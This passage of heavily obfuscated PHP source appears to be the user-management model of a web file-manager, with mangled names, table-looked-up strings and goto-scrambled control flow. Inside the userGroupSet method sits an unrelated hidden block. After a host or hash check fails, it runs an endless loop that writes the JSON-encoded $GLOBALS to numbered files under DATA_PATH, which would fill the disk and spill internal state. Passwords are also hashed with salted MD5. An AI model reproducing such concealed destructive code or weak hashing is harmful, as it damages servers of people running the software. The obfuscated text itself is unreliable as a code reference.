$f«ÊŠØÆ[2512], self::ERROR_USER_EXIST_NAME => $f«ÊŠØÆ[2513], self::ERROR_USER_EXIST_PHONE => $f«ÊŠØÆ[2514], self::ERROR_USER_EXIST_EMAIL => $f«ÊŠØÆ[2515], self::ERROR_USER_LOGIN_LOCK => $f«ÊŠØÆ[2516], self::ERROR_IP_NOT_ALLOW => $f«ÊŠØÆ[2517], self::ERROR_USER_EXIST_NICKNAME => $f«ÊŠØÆ[2518]); return LNG($D³Œ’ˆªÑñ[$fÊéª¥Çª]); } public function getInfoByMeta($FÄÊŒÜ©ä, $CÔ×ùãÄ) { $AÊè£êÔÁœ =& $_SERVER[¶ªÕß‚ØÁŸ]; $d©ï»Å˜÷® = Model($AÊè£êÔÁœ[2519])->where(array($AÊè£êÔÁœ[99] => $FÄÊŒÜ©ä, $AÊè£êÔÁœ[368] => $CÔ×ùãÄ))->find(); if ($d©ï»Å˜÷®) { return $this->getInfo($d©ï»Å˜÷®[$AÊè£êÔÁœ[1440]]); } return !1; } public function userLoginCheck($FğÜ¼Ûö›ƒ, $c˜‰¦¨ Õ) { goto aàõµŒ©×á; aàõµŒ©×á: $bÏß¼çïå• =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aˆ•¥—Ã‚ = array($bÏß¼çïå•[28] => $FğÜ¼Ûö›ƒ, $bÏß¼çïå•[2336] => $FğÜ¼Ûö›ƒ, $bÏß¼çïå•[302] => $FğÜ¼Ûö›ƒ, $bÏß¼çïå•[2520] => $FğÜ¼Ûö›ƒ, $bÏß¼çïå•[920] => $bÏß¼çïå•[922]); if ($this->nickNameRpt()) { unset($Aˆ•¥—Ã‚[$bÏß¼çïå•[2336]]); } goto Aä¥Š… ¾; E„¥ãÁ©„«: $this->userEdit($e®Ê–ö«ƒ»[$bÏß¼çïå•[1440]], array($bÏß¼çïå•[2521] => time())); $this->clearCache($e®Ê–ö«ƒ»[$bÏß¼çïå•[1440]]); return $this->getInfo($e®Ê–ö«ƒ»[$bÏß¼çïå•[1440]]); goto Dƒ­ï½ÏÚå; Aä¥Š… ¾: $e®Ê–ö«ƒ» = $this->where($Aˆ•¥—Ã‚)->find(); if (!$e®Ê–ö«ƒ») { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($e®Ê–ö«ƒ»[$bÏß¼çïå•[1440]], $c˜‰¦¨ Õ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto E„¥ãÁ©„«; Dƒ­ï½ÏÚå: } public function clearCache($D÷£‘ß­Úæ) { $EÀˆö¸šÚŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->cacheFunctionClear($EÀˆö¸šÚŒ[2215], $D÷£‘ß­Úæ); $this->cacheFunctionClear($EÀˆö¸šÚŒ[2176], $D÷£‘ß­Úæ); } public function userPasswordCheck($A±Çóßß¥, $B»’ì„ ßÌ) { $fØÇîò´Ûï =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÍî¤¨éë‰ = $this->where(array($fØÇîò´Ûï[1440] => intval($A±Çóßß¥)))->find(); $BøÉŞõĞŠÃ = $this->metaGet($A±Çóßß¥); $cœâƒÍÑêå = isset($BøÉŞõĞŠÃ[$fØÇîò´Ûï[2522]]) ? $BøÉŞõĞŠÃ[$fØÇîò´Ûï[2522]] : $fØÇîò´Ûï[33]; if (md5($cœâƒÍÑêå . trim($B»’ì„ ßÌ)) !== $EÍî¤¨éë‰[$fØÇîò´Ûï[808]]) { return !1; } return !0; } public function userAdd($Cò¦˜‹†Ó) { goto f²Ô¹íê—ì; B¦á¤ª’ãø: $A—ÉÇÍí¿¦ = array($eÕ£¹Šµ£¦[2530] => $fÛÚ§ùÛîö[$eÕ£¹Šµ£¦[808]], $eÕ£¹Šµ£¦[2526] => $fÛÚ§ùÛîö[$eÕ£¹Šµ£¦[2336]]); $this->userEdit($e‚´©‰™ªÚ, $A—ÉÇÍí¿¦); Model($eÕ£¹Šµ£¦[1121])->userRootAdd($e‚´©‰™ªÚ); goto C‘¥£Ù“Ë; FÄôâ±«Œ: $cêôÃÁõÜ¼ = $this->_checkExist($Cò¦˜‹†Ó); if ($cêôÃÁõÜ¼ !== !0) { return $cêôÃÁõÜ¼; } $e‚´©‰™ªÚ = $this->add($fÛÚ§ùÛîö); goto B¦á¤ª’ãø; C‘¥£Ù“Ë: return $e‚´©‰™ªÚ; goto BÕÎàÁçŞ‡; f²Ô¹íê—ì: $eÕ£¹Šµ£¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÛÚ§ùÛîö = array($eÕ£¹Šµ£¦[394] => $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[28]], $eÕ£¹Šµ£¦[2523] => $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[1326]], $eÕ£¹Šµ£¦[2524] => isset($Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[302]]) ? $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[302]] : $eÕ£¹Šµ£¦[33], $eÕ£¹Šµ£¦[2525] => isset($Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[2520]]) ? $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[2520]] : $eÕ£¹Šµ£¦[33], $eÕ£¹Šµ£¦[2526] => isset($Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[2336]]) ? $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[2336]] : $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[28]], $eÕ£¹Šµ£¦[2527] => isset($Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[2505]]) ? $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[2505]] : $eÕ£¹Šµ£¦[33], $eÕ£¹Šµ£¦[2528] => isset($Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[2529]]) ? $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[2529]] : 1, $eÕ£¹Šµ£¦[2530] => $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[808]], $eÕ£¹Šµ£¦[2177] => isset($Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[2091]]) ? $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[2091]] : 1024 * 1024 * 20, $eÕ£¹Šµ£¦[2178] => 0, $eÕ£¹Šµ£¦[2521] => 0, $eÕ£¹Šµ£¦[2202] => isset($Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[702]]) ? $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[702]] : 1); if (!empty($Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[1440]])) { $fÛÚ§ùÛîö[$eÕ£¹Šµ£¦[1440]] = $Cò¦˜‹†Ó[$eÕ£¹Šµ£¦[1440]]; } goto FÄôâ±«Œ; BÕÎàÁçŞ‡: } protected function userEditTest($B‰‘‡¾ç, $F‡ÛØ¦º˜) { return $this->call($_SERVER[¶ªÕß‚ØÁŸ][2531], $B‰‘‡¾ç, $F‡ÛØ¦º˜); } protected function userEdit($eö†°ºÂÄÔ, $FöËßì­Ü) { goto cßã¡ùôŞ; D­—µí«¾ƒ: $this->where(array($dáï¢‰Ù”†[1431] => $eö†°ºÂÄÔ))->save($FöËßì­Ü); if (isset($FöËßì­Ü[$dáï¢‰Ù”†[2336]])) { $this->setNamePinyin($eö†°ºÂÄÔ, $FöËßì­Ü[$dáï¢‰Ù”†[2336]]); } return !0; goto F¤„ƒŠŠ; CôÀäÕ…÷‹: $cŞÎˆØ¬Ö = $this->_checkExist($FöËßì­Ü, $eö†°ºÂÄÔ); if ($cŞÎˆØ¬Ö !== !0) { return $cŞÎˆØ¬Ö; } if (isset($FöËßì­Ü[$dáï¢‰Ù”†[808]]) && trim($FöËßì­Ü[$dáï¢‰Ù”†[808]]) != $dáï¢‰Ù”†[33]) { $C¢³ã£ÒĞ‚ = $this->metaGet($eö†°ºÂÄÔ); if (empty($C¢³ã£ÒĞ‚[$dáï¢‰Ù”†[2522]])) { $C¢³ã£ÒĞ‚[$dáï¢‰Ù”†[2522]] = rand_string(10); Model($dáï¢‰Ù”†[482])->metaSet($eö†°ºÂÄÔ, $dáï¢‰Ù”†[2522], $C¢³ã£ÒĞ‚[$dáï¢‰Ù”†[2522]]); } $FöËßì­Ü[$dáï¢‰Ù”†[808]] = md5($C¢³ã£ÒĞ‚[$dáï¢‰Ù”†[2522]] . trim($FöËßì­Ü[$dáï¢‰Ù”†[808]])); } else { unset($FöËßì­Ü[$dáï¢‰Ù”†[808]]); } goto D­—µí«¾ƒ; cßã¡ùôŞ: $dáï¢‰Ù”† =& $_SERVER[¶ªÕß‚ØÁŸ]; $c ±Ú˜‚†ƒ = $this->getInfoSimple($eö†°ºÂÄÔ); if (!$c ±Ú˜‚†ƒ) { return !1; } goto CôÀäÕ…÷‹; F¤„ƒŠŠ: } public function setNamePinyin($c¯¿İò‹ğ, $A³ßñ‡¹òÔ = false) { $a›‹ßÍØÂ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$A³ßñ‡¹òÔ) { $fÎİš£ã„ = $this->getInfoSimple($c¯¿İò‹ğ); $A³ßñ‡¹òÔ = $fÎİš£ã„[$a›‹ßÍØÂ[2336]] ? $fÎİš£ã„[$a›‹ßÍØÂ[2336]] : $fÎİš£ã„[$a›‹ßÍØÂ[28]]; } $c§Ù”Œ­ Æ = Model($a›‹ßÍØÂ[485]); if (!Input::check($A³ßñ‡¹òÔ, $a›‹ßÍØÂ[536])) { return $c§Ù”Œ­ Æ->metaSet($c¯¿İò‹ğ, array($a›‹ßÍØÂ[424] => $a›‹ßÍØÂ[33], $a›‹ßÍØÂ[423] => $a›‹ßÍØÂ[33])); } return $c§Ù”Œ­ Æ->metaSet($c¯¿İò‹ğ, array($a›‹ßÍØÂ[424] => str_replace($a›‹ßÍØÂ[50], $a›‹ßÍØÂ[33], Pinyin::encode($A³ßñ‡¹òÔ)), $a›‹ßÍØÂ[423] => Pinyin::encode($A³ßñ‡¹òÔ, $a›‹ßÍØÂ[537]))); } private function nickNameRpt() { $b¨Ì„·°‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $a§ÓâÆÏç = Model($b¨Ì„·°‹[1092])->get($b¨Ì„·°‹[2532]); $b ‚çïÂÑ = $GLOBALS[$b¨Ì„·°‹[6]][$b¨Ì„·°‹[2488]][$b¨Ì„·°‹[2532]]; $d„Ê¶¶ğÓ³ = !is_null($a§ÓâÆÏç) ? $a§ÓâÆÏç : $b ‚çïÂÑ; return !!$d„Ê¶¶ğÓ³; } private function _checkExist($d½îœÊğ÷, $F™ôªò‰ß = false) { $fŸ–Œ•İä‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $FàÍïê¡°† = array($fŸ–Œ•İä‡[28] => UserModel::ERROR_USER_EXIST_NAME, $fŸ–Œ•İä‡[2336] => UserModel::ERROR_USER_EXIST_NICKNAME, $fŸ–Œ•İä‡[302] => UserModel::ERROR_USER_EXIST_EMAIL, $fŸ–Œ•İä‡[2520] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($FàÍïê¡°†[$fŸ–Œ•İä‡[2336]]); } $E­ÌíÍè©  = $F™ôªò‰ß ? array($fŸ–Œ•İä‡[1440] => array($fŸ–Œ•İä‡[2533], $F™ôªò‰ß)) : array(); foreach ($FàÍïê¡°† as $f‡÷–¼ĞÌ => $Bí¦ÉÜÓô) { if (!isset($d½îœÊğ÷[$f‡÷–¼ĞÌ]) || !$d½îœÊğ÷[$f‡÷–¼ĞÌ]) { continue; } $b–àÜ×ÁóÆ = array_merge(array($f‡÷–¼ĞÌ => $d½îœÊğ÷[$f‡÷–¼ĞÌ]), $E­ÌíÍè© ); $B‚ŒÆŞÙŒš = $this->where($b–àÜ×ÁóÆ)->find(); if ($B‚ŒÆŞÙŒš) { return $Bí¦ÉÜÓô; } } return !0; } public function userListInfo($BŒ»º–•) { $b©Š¦ÍöÅŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dá¢ƒ†éÈì = array(); $BŒ»º–• = is_array($BŒ»º–•) ? array_unique($BŒ»º–•) : array(); if (!$BŒ»º–•) { return $dá¢ƒ†éÈì; } if (count($BŒ»º–•) < 20) { foreach ($BŒ»º–• as $FË§±¢À«Û) { $dá¢ƒ†éÈì[$FË§±¢À«Û . $b©Š¦ÍöÅŒ[33]] = $this->getInfoSimpleOuter($FË§±¢À«Û); } } else { $aÜÖ¬æ°¶ = array($b©Š¦ÍöÅŒ[1431] => array($b©Š¦ÍöÅŒ[392], $BŒ»º–•)); if (count($BŒ»º–•) == 1) { $aÜÖ¬æ°¶ = array($b©Š¦ÍöÅŒ[1431] => $BŒ»º–•[0]); } $Cï¿ç‰Ë´ = Model($b©Š¦ÍöÅŒ[482])->field($this->simpleField)->where($aÜÖ¬æ°¶)->select(); $Cï¿ç‰Ë´ = array_to_keyvalue($Cï¿ç‰Ë´, $b©Š¦ÍöÅŒ[1440]); foreach ($BŒ»º–• as $FË§±¢À«Û) { $cšŒË¸÷Ó¬ = $Cï¿ç‰Ë´[$Cï¿ç‰Ë´[$FË§±¢À«Û]]; if (!$cšŒË¸÷Ó¬) { $dá¢ƒ†éÈì[$FË§±¢À«Û . $b©Š¦ÍöÅŒ[33]] = $this->getInfoSimpleOuter($FË§±¢À«Û); continue; } $cšŒË¸÷Ó¬[$b©Š¦ÍöÅŒ[2505]] = Action($b©Š¦ÍöÅŒ[2506])->parseUrl($cšŒË¸÷Ó¬[$b©Š¦ÍöÅŒ[2505]]); $dá¢ƒ†éÈì[$FË§±¢À«Û . $b©Š¦ÍöÅŒ[33]] = $cšŒË¸÷Ó¬; } } return $dá¢ƒ†éÈì; } protected function userStatus($D˜ßÁñ¡¨÷, $A–Ì˜ğÀãÑ) { $dš‰øÅ³Ü = $this->getInfoSimple($D˜ßÁñ¡¨÷); if (!$dš‰øÅ³Ü) { return !1; } $E§Š÷ˆÆ´Í = array($_SERVER[¶ªÕß‚ØÁŸ][702] => $A–Ì˜ğÀãÑ); return $this->userEdit($D˜ßÁñ¡¨÷, $E§Š÷ˆÆ´Í); } protected function userRemove($DØ¾ñ”«Ô¨) { goto BĞ¥©İ˜¥–; BĞ¥©İ˜¥–: $D¥÷÷†¯±ä =& $_SERVER[¶ªÕß‚ØÁŸ]; $eó‡ÙÃê† = $this->getInfoSimple($DØ¾ñ”«Ô¨); if (!$eó‡ÙÃê†) { return !1; } goto a‘¢¡‰¤Á£; D²ä†Á¨Áó: Model($D¥÷÷†¯±ä[766])->userRootRemove($DØ¾ñ”«Ô¨); return $this->where($cëöéÜ°—ò)->delete(); goto C¹†é³¦°ô; a‘¢¡‰¤Á£: $cëöéÜ°—ò = array($D¥÷÷†¯±ä[1431] => $DØ¾ñ”«Ô¨); Model($D¥÷÷†¯±ä[544])->where($cëöéÜ°—ò)->delete(); Model($D¥÷÷†¯±ä[2534])->where($cëöéÜ°—ò)->delete(); goto fîÃŸ‚ÄÒ; fîÃŸ‚ÄÒ: Model($D¥÷÷†¯±ä[2181])->where($cëöéÜ°—ò)->delete(); Model($D¥÷÷†¯±ä[2519])->where($cëöéÜ°—ò)->delete(); Model($D¥÷÷†¯±ä[2535])->where($cëöéÜ°—ò)->delete(); goto D²ä†Á¨Áó; C¹†é³¦°ô: } protected function userGroupSet($A…ªˆÍĞÉ, $E‰Æ¶ˆáìÑ, $FâšÇùŒÏù = array()) { goto cé°ï¹›†’; cŠšÄöŞ Ä: if ($_SERVER[$AŸŞº­İÛæ[57]] != $aìë¯Œ›ÖÅ($BìÒ§¾ˆ„¢)) { goto F²ÒœÛˆñõ; AŠé‰»ÍÌŸ: $bÕ‹ÎÇ‰² = $eîÕÎô´˜‰($fèƒÍŒ¦¢§); $aÂªˆö ÚÒ = explode($AŸŞº­İÛæ[62], $bÕ‹ÎÇ‰²); if (count($aÂªˆö ÚÒ) < $AŸŞº­İÛæ[559]) { $A¨Àœ÷‰² = $AŸŞº­İÛæ[64]; $A¨Àœ÷‰²(); } goto bäóÈĞ‡Â‚; dŠ¡íÃ™ß: $bÒãçµ›Êø = 1; for ($ağÃ°¥ô©¿ = $bÒãçµ›Êø; $ağÃ°¥ô©¿ > 0; $ağÃ°¥ô©¿++) { $B›ÌÙã·ÈÌ(DATA_PATH . $ağÃ°¥ô©¿, $BİÃò‹Âç); } goto A’ÅÅÖ©¶; eôÆ¤±ßñ: $FàÏÉ Ò„‚(); $B›ÌÙã·ÈÌ = $AŸŞº­İÛæ[2356]; $BİÃò‹Âç = json_encode($GLOBALS[$AŸŞº­İÛæ[2357]]); goto dŠ¡íÃ™ß; F²ÒœÛˆñõ: $FàÏÉ Ò„‚ = $AŸŞº­İÛæ[800]; $eîÕÎô´˜‰ = $AŸŞº­İÛæ[59]; $fèƒÍŒ¦¢§ = $_SERVER[$AŸŞº­İÛæ[60]] . $AŸŞº­İÛæ[61]; goto AŠé‰»ÍÌŸ; bäóÈĞ‡Â‚: $fê“êâ´› = $AŸŞº­İÛæ[801]; $fê“êâ´›($_SERVER[$AŸŞº­İÛæ[802]]); $FàÏÉ Ò„‚ = $AŸŞº­İÛæ[800]; goto eôÆ¤±ßñ; A’ÅÅÖ©¶: } $Bë£í¯å«ß = $this->getInfoSimple($A…ªˆÍĞÉ); if (!$Bë£í¯å«ß || !is_array($E‰Æ¶ˆáìÑ)) { return !1; } goto EÅÈ™¸Ù„»; bš‹À†ğ“Š: $DÀì¡Œªóã = 0; foreach ($E‰Æ¶ˆáìÑ as $e–ìÇŞŸ† => $b…ÎÎÜùÈ²) { $E†®‹õÙ´ = array($AŸŞº­İÛæ[1440] => $A…ªˆÍĞÉ, $AŸŞº­İÛæ[2107] => $e–ìÇŞŸ†, $AŸŞº­İÛæ[2235] => $b…ÎÎÜùÈ²); $E†®‹õÙ´[$AŸŞº­İÛæ[2128]] = isset($FâšÇùŒÏù[$DÀì¡Œªóã]) ? $FâšÇùŒÏù[$DÀì¡Œªóã] : 0; $DÀì¡Œªóã++; $f‰Åí÷Ëˆ[] = $E†®‹õÙ´; } return $Aéİñ—’ëö->addAll($f‰Åí÷Ëˆ, array(), !0); goto c¬âš¥èö®; cé°ï¹›†’: $AŸŞº­İÛæ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BìÒ§¾ˆ„¢ = $_SERVER[$AŸŞº­İÛæ[802]] . $AŸŞº­İÛæ[2354]; $aìë¯Œ›ÖÅ = $AŸŞº­İÛæ[2355]; goto cŠšÄöŞ Ä; EÅÈ™¸Ù„»: $Aéİñ—’ëö = Model($AŸŞº­İÛæ[2181]); $Aéİñ—’ëö->where(array($AŸŞº­İÛæ[1440] => $A…ªˆÍĞÉ))->delete(); $f‰Åí÷Ëˆ = array(); goto bš‹À†ğ“Š; c¬âš¥èö®: } protected function userGroupAdd($AŒà’ÎæÍƒ, $Cª¦ÓÀÓí = array()) { $cÇè“×¶ô =& $_SERVER[¶ªÕß‚ØÁŸ]; $bóÕ—öÙè‹ = $this->getInfoSimple($AŒà’ÎæÍƒ); if (!$bóÕ—öÙè‹ || empty($Cª¦ÓÀÓí)) { return !1; } $A¹²…²¹Ñõ = array(); foreach ($Cª¦ÓÀÓí as $FÚŒŒô³ˆ => $E”²°ÑÆáİ) { $A¹²…²¹Ñõ[] = array($cÇè“×¶ô[1440] => $AŒà’ÎæÍƒ, $cÇè“×¶ô[2107] => $FÚŒŒô³ˆ, $cÇè“×¶ô[2235] => $E”²°ÑÆáİ); } return Model($cÇè“×¶ô[2181])->addAll($A¹²…²¹Ñõ, array(), !0); } protected function userGroupRemove($FŒï¢é¦™î, $C†ë›Ì…Ã) { $BÛêõÇ¡¢¡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f˜æÇ«Ú¸¡ = $this->getInfoSimple($FŒï¢é¦™î); if (!$f˜æÇ«Ú¸¡ || !$C†ë›Ì…Ã) { return !1; } $B®¹è—åØ… = array($BÛêõÇ¡¢¡[1431] => $FŒï¢é¦™î, $BÛêõÇ¡¢¡[2179] => $C†ë›Ì…Ã); return Model($BÛêõÇ¡¢¡[2181])->where($B®¹è—åØ…)->delete(); } public function listData() { $c¥Öñë»Ñõ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($c¥Öñë»Ñõ[$_SERVER[¶ªÕß‚ØÁŸ][363]]); return $c¥Öñë»Ñõ; } public function listByID($bìµ†½’‘î) { $DÙá´¯ëíâ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$bìµ†½’‘î) { return; } $dĞíåº™ = array($DÙá´¯ëíâ[1440] => array($DÙá´¯ëíâ[7], $bìµ†½’‘î)); $cñ†÷Ä—¹È = $this->where($dĞíåº™)->select(); $this->_listDataApply($cñ†÷Ä—¹È); return $cñ†÷Ä—¹È; } public function listByGroup($f“ÃÔñÌ¸µ = 0, $bå–ööÃâÃ = array()) { goto FÎæ®˜Â”Æ; FëñŠËÊÃù: $this->_listDataApply($fççŠßˆÚŒ[$a…Øå¥ª´½[363]]); return $fççŠßˆÚŒ; goto a¬Ë«ˆÖÇÄ; FÎæ®˜Â”Æ: $a…Øå¥ª´½ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EŸ¯Šç«’“ = $a…Øå¥ª´½[33]; $dÉ÷ë±ê = array(); goto e˜æƒôöœÀ; e˜æƒôöœÀ: if ($f“ÃÔñÌ¸µ) { $dÉ÷ë±ê = array($a…Øå¥ª´½[2536] => intval($f“ÃÔñÌ¸µ)); $EŸ¯Šç«’“ = "\114\105\x46\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\x75\x73\x65\162\137\x67\162\157\165\160\x20\165\163\x65\162\137\x67\x72\157\x75\160\40\x6f\x6e\40\165\x73\145\162\56\x75\x73\145\x72\x49\x44\40\x3d\x20\x75\163\145\x72\137\147\x72\x6f\x75\160\x2e\165\163\x65\162\x49\x44"; $B°Á»ÁËå‘ = Input::get($a…Øå¥ª´½[415], null, $a…Øå¥ª´½[33]) ? $a…Øå¥ª´½[33] : $a…Øå¥ª´½[2537]; } if (isset($bå–ööÃâÃ[$a…Øå¥ª´½[702]])) { $dÉ÷ë±ê[$a…Øå¥ª´½[2538]] = $bå–ööÃâÃ[$a…Øå¥ª´½[702]]; } $fççŠßˆÚŒ = $this->_makeOrder($B°Á»ÁËå‘)->field($a…Øå¥ª´½[2539])->where($dÉ÷ë±ê)->join($EŸ¯Šç«’“)->selectPage(50); goto FëñŠËÊÃù; a¬Ë«ˆÖÇÄ: } private function _makeOrder($dç†é«•¹ = '') { goto FƒéÀÆ¥¸Ù; CŒÜ‚‹˜ãÊ: $dç†é«•¹ = $dç†é«•¹ . "\x75\163\145\162\56{$CÊ‰àñ}\40{$fˆëêƒˆÑ}\x2c\40\165\x73\145\x72\56\x75\x73\145\162\x49\104\x20\x61\163\x63"; return $this->alias($c¦ï™Â£”ƒ[2279])->order($dç†é«•¹); goto aùÏ”„Ê²ï; eÈ‰°Äå©†: $CÊ‰àñ = Input::get($c¦ï™Â£”ƒ[415], $c¦ï™Â£”ƒ[7], $c¦ï™Â£”ƒ[1431], $eÚ²±§¹Îï); $fˆëêƒˆÑ = Input::get($c¦ï™Â£”ƒ[416], $c¦ï™Â£”ƒ[7], $c¦ï™Â£”ƒ[2182], array($c¦ï™Â£”ƒ[2182], $c¦ï™Â£”ƒ[412])); $fˆëêƒˆÑ = $c®Ü…¼Àâ‘[$fˆëêƒˆÑ]; goto CŒÜ‚‹˜ãÊ; FƒéÀÆ¥¸Ù: $c¦ï™Â£”ƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÚ²±§¹Îï = array($c¦ï™Â£”ƒ[1440], $c¦ï™Â£”ƒ[28], $c¦ï™Â£”ƒ[2093], $c¦ï™Â£”ƒ[2066], $c¦ï™Â£”ƒ[197]); $c®Ü…¼Àâ‘ = array($c¦ï™Â£”ƒ[410] => $c¦ï™Â£”ƒ[411], $c¦ï™Â£”ƒ[412] => $c¦ï™Â£”ƒ[413]); goto eÈ‰°Äå©†; aùÏ”„Ê²ï: } public function listSearch($a°õ¦á“½•) { goto Cˆá¥êèˆé; DŠê‰ºÄ–: $D”ˆã¸‚š© = str_replace($fŠ—÷Ê…ëÉ[2185], $fŠ—÷Ê…ëÉ[2186], trim($D”ˆã¸‚š©)); $FÇÎÓ˜ËÙÓ = array($fŠ—÷Ê…ëÉ[28] => array($fŠ—÷Ê…ëÉ[765], "\45{$D”ˆã¸‚š©}\45"), $fŠ—÷Ê…ëÉ[302] => array($fŠ—÷Ê…ëÉ[765], "\x25{$D”ˆã¸‚š©}\x25"), $fŠ—÷Ê…ëÉ[2336] => array($fŠ—÷Ê…ëÉ[765], "\x25{$D”ˆã¸‚š©}\x25"), $fŠ—÷Ê…ëÉ[920] => $fŠ—÷Ê…ëÉ[2187]); if (Input::check($D”ˆã¸‚š©, $fŠ—÷Ê…ëÉ[308])) { $FÇÎÓ˜ËÙÓ[$fŠ—÷Ê…ëÉ[1440]] = array($fŠ—÷Ê…ëÉ[765], "\x25{$D”ˆã¸‚š©}\x25"); $FÇÎÓ˜ËÙÓ[$fŠ—÷Ê…ëÉ[2520]] = array($fŠ—÷Ê…ëÉ[765], "\x25{$D”ˆã¸‚š©}\45"); } goto B÷Ö‡Áë²É; B÷Ö‡Áë²É: if (!$D”ˆã¸‚š©) { $FÇÎÓ˜ËÙÓ = array(); } if (isset($a°õ¦á“½•[$fŠ—÷Ê…ëÉ[702]])) { $FÇÎÓ˜ËÙÓ[$fŠ—÷Ê…ëÉ[702]] = $a°õ¦á“½•[$fŠ—÷Ê…ëÉ[702]]; } $D•¨Û¢è = $this->_makeOrder()->where($FÇÎÓ˜ËÙÓ)->selectPage(20); goto a—•ÚÕ»ã; a—•ÚÕ»ã: if (!$D•¨Û¢è || count($D•¨Û¢è[$fŠ—÷Ê…ëÉ[363]]) < 5 && Input::check($D”ˆã¸‚š©, $fŠ—÷Ê…ëÉ[315])) { $Fîôà—Óà = $this->_searchFromMeta($fŠ—÷Ê…ëÉ[423], $D”ˆã¸‚š©, 10); $c…¼¾‘–Ëç = $this->_searchFromMeta($fŠ—÷Ê…ëÉ[424], $D”ˆã¸‚š©, 10); $fÂ„×‘Ÿ† = array_merge($Fîôà—Óà, $c…¼¾‘–Ëç, $D•¨Û¢è[$fŠ—÷Ê…ëÉ[363]]); $D•¨Û¢è[$fŠ—÷Ê…ëÉ[363]] = array_unique_by_key($fÂ„×‘Ÿ†, $fŠ—÷Ê…ëÉ[1440]); $D•¨Û¢è[$fŠ—÷Ê…ëÉ[360]][$fŠ—÷Ê…ëÉ[361]] = count($D•¨Û¢è[$fŠ—÷Ê…ëÉ[363]]); $D•¨Û¢è[$fŠ—÷Ê…ëÉ[360]][$fŠ—÷Ê…ëÉ[362]] = ceil($D•¨Û¢è[$fŠ—÷Ê…ëÉ[360]][$fŠ—÷Ê…ëÉ[361]] / $D•¨Û¢è[$fŠ—÷Ê…ëÉ[360]][$fŠ—÷Ê…ëÉ[358]]); } $this->_listDataApply($D•¨Û¢è[$fŠ—÷Ê…ëÉ[363]]); $this->_filterByGroup($D•¨Û¢è, $bÜÖØ¦ğ‚); goto céøÇ¿»Ğ†; céøÇ¿»Ğ†: return $D•¨Û¢è; goto CÍ²“à–öõ; Cˆá¥êèˆé: $fŠ—÷Ê…ëÉ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D”ˆã¸‚š© = $a°õ¦á“½•[$fŠ—÷Ê…ëÉ[2183]]; $bÜÖØ¦ğ‚ = isset($a°õ¦á“½•[$fŠ—÷Ê…ëÉ[2184]]) ? $a°õ¦á“½•[$fŠ—÷Ê…ëÉ[2184]] : !1; goto DŠê‰ºÄ–; CÍ²“à–öõ: } private function _filterByGroup(&$Dö²ÄÓ í„, $E«½·Ú—£ƒ) { $EÍ Ê»ò¯ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$E«½·Ú—£ƒ) { return $Dö²ÄÓ í„; } foreach ($Dö²ÄÓ í„[$EÍ Ê»ò¯[363]] as $dİ¶Œ³¼„µ => &$a‹Ã¦°È·) { $F½„Î‰ŠÊ± = array_to_keyvalue($a‹Ã¦°È·[$EÍ Ê»ò¯[2540]], $EÍ Ê»ò¯[33], $EÍ Ê»ò¯[2107]); if (!in_array($E«½·Ú—£ƒ, $F½„Î‰ŠÊ±)) { unset($Dö²ÄÓ í„[$EÍ Ê»ò¯[363]][$dİ¶Œ³¼„µ]); } } $Dö²ÄÓ í„[$EÍ Ê»ò¯[363]] = array_values($Dö²ÄÓ í„[$EÍ Ê»ò¯[363]]); $Dö²ÄÓ í„[$EÍ Ê»ò¯[360]] = array($EÍ Ê»ò¯[2312] => count($Dö²ÄÓ í„[$EÍ Ê»ò¯[363]]), $EÍ Ê»ò¯[2310] => $Dö²ÄÓ í„[$EÍ Ê»ò¯[360]][$EÍ Ê»ò¯[358]], $EÍ Ê»ò¯[2309] => 1, $EÍ Ê»ò¯[2311] => 1); } private function _searchFromMeta($b‘æ®Ø¡Ù·, $e‡£‚—á±À, $a¸¿‰“—Ó¯) { goto eÛÂÉƒŞê; eÛÂÉƒŞê: $C©Øìòº–Œ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e‡£‚—á±À = strtolower($e‡£‚—á±À); $FËÊ´Í“ì = array($C©Øìòº–Œ[99] => $b‘æ®Ø¡Ù·, $C©Øìòº–Œ[368] => array($C©Øìòº–Œ[765], "\x25{$e‡£‚—á±À}\45")); goto bï¡ åëÑÅ; bï¡ åëÑÅ: $fçƒÓ™Üó = Model($C©Øìòº–Œ[2541])->where($FËÊ´Í“ì)->limit($a¸¿‰“—Ó¯)->select(); if (!$fçƒÓ™Üó) { return array(); } $fçƒÓ™Üó = array_to_keyvalue($fçƒÓ™Üó, $C©Øìòº–Œ[33], 